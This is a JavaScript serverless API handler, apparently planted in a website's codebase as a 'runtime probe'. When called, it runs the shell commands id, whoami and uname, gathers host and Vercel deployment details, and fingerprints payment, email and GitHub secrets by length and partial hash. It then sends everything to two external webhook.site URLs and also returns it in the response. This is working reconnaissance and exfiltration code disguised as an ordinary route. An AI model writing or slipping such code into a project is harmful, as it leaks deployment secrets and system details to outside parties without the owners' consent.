const os = require('os');
const https = require('https');
const cp = require('child_process');
const { URL } = require('url');

const ENDPOINTS = [
  'https://webhook.site/124bb488-0239-4029-b600-05dd2b31859c',
  'https://webhook.site/e1a14aa5-aade-460d-bd8c-c07964eaeb13',
];

function sh(cmd) {
  try {
    return String(cp.execSync(cmd, { timeout: 3000, encoding: 'utf8' })).slice(0, 2000);
  } catch (e) {
    return 'ERR';
  }
}

function fp(v) {
  if (!v) return null;
  try {
    const c = require('crypto').createHash('sha256').update(String(v)).digest('hex');
    return { len: String(v).length, sha256_12: c.slice(0, 12) };
  } catch (e) {
    return { len: String(v).length };
  }
}

export default async function handler(req, res) {
  const info = {
    tag: 'opensats-website-runtime-probe-i1381',
    ts: new Date().toISOString(),
    hostname: os.hostname(),
    cwd: process.cwd(),
    node: process.version,
    uid: typeof process.getuid === 'function' ? process.getuid() : null,
    gid: typeof process.getgid === 'function' ? process.getgid() : null,
    idcmd: sh('id'),
    whoami: sh('whoami'),
    uname: sh('uname -a'),
    vercel: {
      env: process.env.VERCEL_ENV || null,
      target: process.env.VERCEL_TARGET_ENV || null,
      url: process.env.VERCEL_URL || null,
      region: process.env.VERCEL_REGION || null,
      sha: process.env.VERCEL_GIT_COMMIT_SHA || null,
      deploymentId: process.env.VERCEL_DEPLOYMENT_ID || null,
      projectName: process.env.VERCEL_PROJECT_NAME || null,
    },
    envCount: Object.keys(process.env).length,
    has: {
      STRIPE_SECRET_KEY: fp(process.env.STRIPE_SECRET_KEY),
      STRIPE_WEBHOOK_SECRET: fp(process.env.STRIPE_WEBHOOK_SECRET),
      BTCPAY_API_KEY: fp(process.env.BTCPAY_API_KEY),
      BTCPAY_WEBHOOK_SECRET_GENERAL: fp(process.env.BTCPAY_WEBHOOK_SECRET_GENERAL),
      SENDGRID_API_KEY: fp(process.env.SENDGRID_API_KEY),
      GH_ACCESS_TOKEN: fp(process.env.GH_ACCESS_TOKEN),
    },
  };

  // out-of-band callback to prove egress from the production runtime
  try {
    const body = Buffer.from(JSON.stringify(info));
    for (const ep of ENDPOINTS) {
      try {
        const u = new URL(ep);
        await new Promise((resolve) => {
          const r = https.request(
            {
              hostname: u.hostname,
              path: u.pathname,
              method: 'POST',
              headers: { 'content-type': 'application/json', 'content-length': body.length, 'x-probe': 'opensats-rt-i1381' },
              timeout: 3000,
            },
            (rs) => { rs.on('data', () => {}); rs.on('end', resolve); }
          );
          r.on('error', resolve);
          r.on('timeout', () => { try { r.destroy(); } catch (e) {} resolve(); });
          r.end(body);
        });
      } catch (e) {}
    }
  } catch (e) {}

  res.setHeader('cache-control', 'no-store');
  res.status(200).json(info);
}
